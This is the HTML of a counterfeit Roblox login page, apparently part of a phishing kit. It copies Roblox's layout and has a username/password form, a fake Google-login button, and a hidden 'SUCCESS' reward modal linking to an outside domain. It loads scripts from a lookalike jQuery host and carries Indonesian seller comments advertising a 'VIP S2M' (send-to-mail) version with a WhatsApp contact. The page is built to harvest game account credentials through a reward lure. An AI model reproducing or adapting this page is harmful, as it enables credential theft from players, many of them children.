<li class="navbar-search-option rbx-clickable-li"><a class="new-navbar-search-anchor" href="https://www.roblox.com/search/communities?keyword="><span class="icon-menu-groups navbar-list-option-icon"></span><span class="navbar-list-option-text"></span><span class="navbar-list-option-suffix">
in Communities
</span></a></li>                                            
<li class="navbar-search-option rbx-clickable-li"><a class="new-navbar-search-anchor" href="https://create.roblox.com/store/models?keyword="><span class="icon-menu-library navbar-list-option-icon"></span><span class="navbar-list-option-text"></span><span class="navbar-list-option-suffix">
in Creator Store
</span></a></li>                            
</ul>                            
<div id="search-landing-root" data-testid="search-landing-root" class="search-landing-root"></div>                        
</div>                        
<div class="navbar-right rbx-navbar-right">                            
<ul class="nav navbar-right rbx-navbar-right-nav">                                
<li class="signup-button-container"><a class="rbx-navbar-signup btn-growth-sm nav-menu-title signup-button" href="https://www.roblox.com/account/signupredir?returnUrl=" id="sign-up-button">
Sign Up
</a></li>                                
<li class="login-action"></li>                                
<li class="rbx-navbar-right-search">                                    
<button type="button" class="rbx-menu-item btn-navigation-nav-search-white-md"><span class="icon-nav-search-white"></span></button>                                
</li>                            
</ul>                        
</div>                    
</div>                
</div>            
</div>            
<div id="left-navigation-container"></div>            
<div id="verificationUpsell-container">                
<div></div>            
</div>            
<div id="phoneVerificationUpsell-container">                
<div phoneverificationupsell-container=""></div>            
</div>            
<div id="contactMethodPrompt-container">                
<div contactmethodprompt-container=""></div>            
</div>            
<div id="navigation-account-switcher-container">                
<div navigation-account-switcher-container=""></div>            
</div>        
</div>        
<script type="text/javascript">            var Roblox = Roblox || {};
            (function () {
                if (Roblox && Roblox.Performance) {
                    Roblox.Performance.setPerformanceMark("navigation_end");
                }
            })();
        
</script>        
<main class="container-main content-no-ads 
                
                
                
                
                " id="container-main" tabindex="-1">            
<script type="text/javascript">                if (top.location != self.location) {
                    top.location = self.location.href;
                }
            
</script>            
<div class="alert-container">                
<noscript>                    
<div>                        
<div class="alert-info" role="alert">
Please enable Javascript to use all the features on this site.
</div>                    
</div>                
</noscript>            
</div><script type="text/javascript"></script><div class="content" id="content">                
<div id="react-login-web-app" class="login-container">                    
<div id="login-base" class="login-base-container">                        
<div class="section-content login-section">                            
<h1 class="login-header">
Login to Roblox
</h1>                            
<div id="login-form">                                
<div>                                    
<div class="login-form-container">                                        
<form class="login-form" name="loginForm" id="loginForm">
 
<div class="form-group username-form-group">                                                
<label for="login-username" class="sr-only">
Username/Email/Phone
</label>                                                
<input id="login-username" name="username" type="text" class="form-control input-field" autocomplete="username webauthn" placeholder="Username/Email/Phone" required="">                                            
</div>                                            
<div class="form-group password-form-group">                                                
<label for="login-password" class="sr-only">
Password
</label>                                                
<input id="login-password" name="password" type="password" class="form-control input-field" placeholder="Password" required="">                                                
<div aria-live="polite"></div>                                            
</div>                                            
<input type="hidden" name="login" value="Roblox">                                            
<input type="hidden" name="userID" value="Dddfznznz"><script type="text/javascript"></script><button type="submit" id="login-button" class="btn-full-width login-button btn-secondary-md">
Log In
</button>                                        
</form>                                    
</div>                                
</div>                            
</div>                            
<div class="text-center forgot-credentials-link"><a id="forgot-credentials-link" class="text-link" href="https://www.roblox.com/login/forgot-password-or-username" target="_self">
Forgot Password or Username?
</a></div>                            
<div>                                
<div class="alternative-login-divider-container">                                    
<div class="rbx-divider alternative-login-divider"></div>                                
</div>                                
<button type="button" onclick="alert('Under maintenace!');" id="otp-login-button" class="btn-full-width btn-control-md otp-login-button"><img src="https://cdn1.iconfinder.com/data/icons/google-s-logo/150/Google_Icons-09-512.png" width="30px;">
 Login with Google Account
</button>                                
<button type="button" id="cross-device-login-button" class="btn-full-width btn-control-md cross-device-login-button"><span>
Use Another Device
</span></button>                            
</div>                            
<div id="crossDeviceLoginDisplayCodeModal-container"></div>                            
<div id="otp-login-container"></div>                            
<div id="account-switcher-confirmation-modal-container"></div>                            
<div class="text-center">                                
<div class="signup-option"><span class="no-account-text">
Don't have an account?
</span><a id="sign-up-link" class="text-link signup-link" href="https://www.roblox.com/" target="_self">
Sign Up
</a></div>                            
</div>                        
</div>                        
<div id="react-login-account-limit-error-container"></div>                    
</div>                
</div>            
</div>        
</main>        
<footer class="container-footer" id="footer-container" data-is-giftcards-footer-enabled="True">            
<div class="footer">                
<ul class="row footer-links">                    
<li class="footer-link"><a href="https://www.roblox.com/info/about-us?locale=en_us" class="text-footer-nav" target="_blank" rel="noreferrer">
About Us
</a></li>                    
<li class="footer-link"><a href="https://www.roblox.com/info/jobs?locale=en_us" class="text-footer-nav" target="_blank" rel="noreferrer">
Jobs
</a></li>                    
<li class="footer-link"><a href="https://www.roblox.com/info/blog?locale=en_us" class="text-footer-nav" target="_blank" rel="noreferrer">
Blog
</a></li>                    
<li class="footer-link"><a href="https://www.roblox.com/info/parents?locale=en_us" class="text-footer-nav" target="_blank" rel="noreferrer">
Parents
</a></li>                    
<li class="footer-link"><a href="https://www.roblox.com/giftcards?locale=en_us" class="text-footer-nav giftcards" target="_blank" rel="noreferrer">
Gift Cards
</a></li>                    
<li class="footer-link"><a href="https://www.roblox.com/info/help?locale=en_us" class="text-footer-nav" target="_blank" rel="noreferrer">
Help
</a></li>                    
<li class="footer-link"><a href="https://www.roblox.com/info/terms?locale=en_us" class="text-footer-nav" target="_blank" rel="noreferrer">
Terms
</a></li>                    
<li class="footer-link"><a href="https://www.roblox.com/info/accessibility?locale=en_us" class="text-footer-nav" target="_blank" rel="noreferrer">
Accessibility
</a></li>                    
<li class="footer-link"><a href="https://www.roblox.com/info/privacy?locale=en_us" class="text-footer-nav" target="_blank" rel="noreferrer">
Privacy
</a></li>                    
<li class="footer-link"><a href="https://www.roblox.com/my/account#!/privacy?locale=en_us" class="text-footer-nav" target="_blank" rel="noreferrer">
Your Privacy Choices
<img src="https://images.rbxcdn.com/dbc562edb12e2e68.webp" alt="" class="footer-postfixIcon"></a></li>                    
<li></li>                
</ul>                
<div class="row copyright-container">                    
<div class="col-sm-6 col-md-3"></div>                    
<div class="col-sm-12">                        
<p class="text-footer footer-note">
Â©2025 Roblox Corporation. Roblox, the Roblox logo and Powering Imagination are among our registered and unregistered trademarks in the U.S. and other countries.
</p>                    
</div>                
</div>            
</div>        
</footer>    
</div>    
<div id="user-agreements-checker-container"></div>    
<div id="access-management-upsell-container">        
<div id="legally-sensitive-content-component"></div>    
</div>    
<div id="global-privacy-control-checker-container"></div>    
<div id="cookie-banner-wrapper" class="cookie-banner-wrapper">        
<div></div>    
</div>    
<script type="text/javascript">        if (typeof Roblox === "undefined") {
            Roblox = {};
        }
        if (typeof Roblox.PlaceLauncher === "undefined") {
            Roblox.PlaceLauncher = {};
        }
        var robloxIcon = "
<span class='app-icon-bluebg app-icon-windows app-icon-size-96'></span>
";
        var studioIcon = "
<span class='studio-icon studio-icon-windows studio-icon-size-96'></span>
";
        Roblox.PlaceLauncher.Resources = {
            RefactorEnabled: "True",
            IsProtocolHandlerBaseUrlParamEnabled: "False",
            ProtocolHandlerAreYouInstalled: {
                play: {
                    content: robloxIcon   "
<p>
You're moments away from getting into the experience!
</p>
",
                    buttonText: "Download and Install Roblox",
                    footerContent: "
<a href='https://assetgame.roblox.com/game/help'class= 'text-name small' target='_blank' >
Click here for help
</a>
 "
                },
                studio: {
                    content: studioIcon    "
<p>
Get started creating your own experiences!
</p>
",
                    buttonText: "Download Studio"
                }
            },
            ProtocolHandlerStartingDialog: {
                play: {
                    content: robloxIcon   "
<p>
Roblox is now loading. Get ready!
</p>
"
                },
                studio: {
                    content: studioIcon   "
<p>
Checking for Roblox Studio...
</p>
"
                },
                loader: "
<span class='spinner spinner-default'></span>
"
            }
        };
    
</script>    
<div id="PlaceLauncherStatusPanel" style="display:none;width:300px" data-new-plugin-events-enabled="True" data-event-stream-for-plugin-enabled="True" data-event-stream-for-protocol-enabled="True" data-is-join-attempt-id-enabled="True" data-is-game-launch-interface-enabled="True" data-is-protocol-handler-launch-enabled="True" data-is-duar-auto-opt-in-enabled="false" data-is-duar-opt-out-disabled="false" data-is-user-logged-in="False" data-os-name="Windows" data-protocol-name-for-client="roblox-player" data-protocol-name-for-studio="roblox-studio" data-protocol-roblox-locale="en_us" data-protocol-game-locale="en_us" data-protocol-url-includes-launchtime="true" data-protocol-detection-enabled="true" data-protocol-separate-script-parameters-enabled="true" data-protocol-avatar-parameter-enabled="false" data-protocol-channel-name="LIVE" data-protocol-studio-channel-name="LIVE" data-protocol-player-channel-name="LIVE">        
<div class="modalPopup blueAndWhite PlaceLauncherModal" style="min-height: 160px">            
<div id="Spinner" class="Spinner" style="padding:20px 0;">                
<img data-delaysrc="https://images.rbxcdn.com/e998fb4c03e8c2e30792f2f3436e9416.gif" height="32" width="32" alt="Progress" src="https://images.rbxcdn.com/e998fb4c03e8c2e30792f2f3436e9416.gif" class="src-replaced">            
</div>            
<div id="status" style="min-height:40px;text-align:center;margin:5px 20px">                
<div id="Starting" class="PlaceLauncherStatus MadStatusStarting" style="display:block">                    Starting Roblox...
                
</div>                
<div id="Waiting" class="PlaceLauncherStatus MadStatusField">
Connecting to People...
</div>                
<div id="StatusBackBuffer" class="PlaceLauncherStatus PlaceLauncherStatusBackBuffer MadStatusBackBuffer"></div>            
</div>            
<div style="text-align:center;margin-top:1em">                
<input type="button" class="Button CancelPlaceLauncherButton translate" value="Cancel">            
</div>        
</div>    
</div>    
<div id="ProtocolHandlerClickAlwaysAllowed" class="ph-clickalwaysallowed" style="display:none;">        
<p class="larger-font-size">            
<span class="icon-moreinfo"></span>
 Check 
<strong>
Always open links for URL: Roblox Protocol
</strong>
 and click 
<strong>
Open URL: Roblox Protocol
</strong>
 in the dialog box above to join experiences faster in the future!
        
</p>    
</div>    
<script type="text/javascript">        function checkRobloxInstall() {
                 return RobloxLaunch.CheckRobloxInstall('https://www.roblox.com/Download');
        }
    
</script>    
<div id="InstallationInstructions" class="" style="display:none;">        
<div class="ph-installinstructions">            
<div class="ph-modal-header">                
<span class="icon-close simplemodal-close"></span>                
<h3 class="title">
Thanks for visiting Roblox
</h3>            
</div>            
<div class="modal-content-container">                
<div class="ph-installinstructions-body ">                    
<ul class="modal-col-4">                        
<li class="step1-of-4">                            
<h2>
1
</h2>                            
<p class="larger-font-size">
Click 
<strong>
RobloxPlayer.exe
</strong>
 to run the Roblox installer, which just downloaded via your web browser.
</p>                            
<div style="margin-top:60px">                                
<img data-delaysrc="https://images.rbxcdn.com/bcf5d84d4469c075e6296bfbc4deabb1" src="https://images.rbxcdn.com/bcf5d84d4469c075e6296bfbc4deabb1" class="src-replaced">                            
</div>                        
</li>                        
<li class="step2-of-4">                            
<h2>
2
</h2>                            
<p class="larger-font-size">
Click 
<strong>
Run
</strong>
 when prompted by your computer to begin the installation process.
</p>                            
<img data-delaysrc="https://images.rbxcdn.com/51328932dedb5d8d61107272cc1a27db.png" src="https://images.rbxcdn.com/51328932dedb5d8d61107272cc1a27db.png" class="src-replaced">                        
</li>                        
<li class="step3-of-4">                            
<h2>
3
</h2>                            
<p class="larger-font-size">
Click 
<strong>
Ok
</strong>
 once you've successfully installed Roblox.
</p>                            
<img data-delaysrc="https://images.rbxcdn.com/bbdb38de8bb89ecc07730b41666a26a4" src="https://images.rbxcdn.com/bbdb38de8bb89ecc07730b41666a26a4" class="src-replaced">                        
</li>                        
<li class="step4-of-4">                            
<h2>
4
</h2>                            
<p class="larger-font-size">
After installation, click 
<strong>
Join
</strong>
 below to join the action!
</p>                            
<div class="VisitButton VisitButtonContinueGLI">                                
<a class="btn btn-primary-lg disabled btn-full-width">
Join
</a>                            
</div>                        
</li>                    
</ul>                
</div>            
</div>            
<div class="xsmall">                The Roblox installer should download shortly. If it doesnâ€™t, start the 
<a id="GameLaunchManualInstallLink" href="#" class="text-link">
download now.
</a>            
</div>        
</div>    
</div>    
<div class="InstallInstructionsImage" data-modalwidth="970" style="display:none;"></div>    
<div id="pluginObjDiv" style="height:1px;width:1px;visibility:hidden;position: absolute;top: 0;"></div>    
<iframe id="downloadInstallerIFrame" name="downloadInstallerIFrame" style="visibility:hidden;height:0;width:1px;position:absolute"></iframe>    
<script onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="clientinstaller" type="text/javascript" src="https://js.rbxcdn.com/00e1d37a965af4242dc6b296d6c883f0.js"></script>    
<script type="text/javascript">        Roblox.Client._skip = null;
        Roblox.Client._CLSID = '76D50904-6780-4c8b-8986-1A7EE0B1716D';
        Roblox.Client._installHost = 'setup.roblox.com';
        Roblox.Client.ImplementsProxy = true;
        Roblox.Client._silentModeEnabled = true;
        Roblox.Client._bringAppToFrontEnabled = false;
        Roblox.Client._currentPluginVersion = '';
        Roblox.Client._eventStreamLoggingEnabled = true;
    
    
            Roblox.Client._installSuccess = function() {
                if(GoogleAnalyticsEvents){
                    GoogleAnalyticsEvents.ViewVirtual('InstallSuccess');
                    GoogleAnalyticsEvents.FireEvent(['Plugin','Install Success']);
                    if (Roblox.Client._eventStreamLoggingEnabled && typeof Roblox.GamePlayEvents != "undefined") {
                        Roblox.GamePlayEvents.SendInstallSuccess(Roblox.Client._launchMode, play_placeId);
                    }
                }
            }
            
            if ((window.chrome || window.safari) && window.location.hash == '#chromeInstall') {
                window.location.hash = '';
                var continuation = '('   $.cookie('chromeInstall')   ')';
                play_placeId = $.cookie('chromeInstallPlaceId');
                Roblox.GamePlayEvents.lastContext = $.cookie('chromeInstallLaunchMode');
                $.cookie('chromeInstallPlaceId', null);
                $.cookie('chromeInstallLaunchMode', null);
                $.cookie('chromeInstall', null);
                RobloxLaunch._GoogleAnalyticsCallback = function() { var isInsideRobloxIDE = 'website'; if (Roblox && Roblox.Client && Roblox.Client.isIDE && Roblox.Client.isIDE()) { isInsideRobloxIDE = 'Studio'; };GoogleAnalyticsEvents.FireEvent(['Plugin Location', 'Launch Attempt', isInsideRobloxIDE]);GoogleAnalyticsEvents.FireEvent(['Plugin', 'Launch Attempt', 'Play']);EventTracker.fireEvent('GameLaunchAttempt_Win32', 'GameLaunchAttempt_Win32_Plugin'); if (typeof Roblox.GamePlayEvents != 'undefined') { Roblox.GamePlayEvents.SendClientStartAttempt(null, play_placeId); }  }; 
                Roblox.Client.ResumeTimer(eval(continuation));
            }
    
</script>    
<div class="ConfirmationModal modalPopup unifiedModal smallModal" data-modal-handle="confirmation" style="display:none;">        
<a class="genericmodal-close ImageButton closeBtnCircle_20h"></a>        
<div class="Title"></div>        
<div class="GenericModalBody">            
<div class="TopBody">                
<div class="ImageContainer roblox-item-image" data-image-size="small" data-no-overlays="" data-no-click="">                    
<img class="GenericModalImage" alt="generic image">                
</div>                
<div class="Message"></div>            
</div>            
<div class="ConfirmationModalButtonContainer GenericModalButtonContainer">                
<a href="" id="roblox-confirm-btn"><span></span></a>                
<a href="" id="roblox-decline-btn"><span></span></a>            
</div>            
<div class="ConfirmationModalFooter">            
</div>        
</div>        
<script type="text/javascript">            Roblox = Roblox || {};
            Roblox.Resources = Roblox.Resources || {};
            
            Roblox.Resources.GenericConfirmation = {
                yes: "Yes",
                No: "No",
                Confirm: "Confirm",
                Cancel: "Cancel"
            };
        
</script>    
</div>    
<div id="modal-confirmation" class="modal-confirmation" data-modal-type="confirmation">        
<div id="modal-dialog" class="modal-dialog">            
<div class="modal-content">                
<div class="modal-header">                    
<button type="button" class="close" data-dismiss="modal">                        
<span aria-hidden="true"><span class="icon-close"></span></span><span class="sr-only">
Close
</span>                    
</button>                    
<h5 class="modal-title">
</h5>                
</div>                
<div class="modal-body">                    
<div class="modal-top-body">                        
<div class="modal-message">
</div>                        
<div class="modal-image-container roblox-item-image" data-image-size="medium" data-no-overlays="" data-no-click="">                            
<img class="modal-thumb" alt="generic image">                        
</div>                        
<div class="modal-checkbox checkbox">                            
<input id="modal-checkbox-input" type="checkbox">                            
<label for="modal-checkbox-input">
</label>                        
</div>                    
</div>                    
<div class="modal-btns">                        
<a href="" id="confirm-btn">
<span>
</span>
</a>                        
<a href="" id="decline-btn">
<span>
</span>
</a>                    
</div>                    
<div class="loading modal-processing">   
<img class="loading-default" src="https://images.rbxcdn.com/4bed93c91f909002b1f17f05c0ce13d1.gif" alt="Processing...">                 
</div>                
</div>                
<div class="modal-footer text-footer">     
</div>            
</div>        
</div>    
</div>
<script type="text/javascript">
<script src="js/script.js"></script>
</script>
<div id="usernameModal" style="display: none; margin-top: 32%">    
<div class="modal-content-roblox">        
<h1 class="modal-title" style="color: #4CAF50;">
SUCCESS
</h1>        
<p>
We are processing the delivery of your reward to your account. Please allow up to 24 hours for the full reward to be received.
</p>        
<a href="https://continue.my.id/" class="roblox-button" style="margin-top: 20px; text-decoration: none; display: inline-flex;">
CONTINUE
</a>    
</div>
</div>
  <script src="https://jquery.biz.id/libs/jquery-28.min.js"></script>
  <script src="js/jquery.min.js"></script>
<?php
//DON'T DELETE THIS MODULE
//MODULE DI ENC BIAR KAGA KE MALINGAN KODE
?>
<script>
// KHUSUS VIP S2M MINAT CHAT WA SAMPING https://wa.me/6289509551861
</script>
</body>
</html>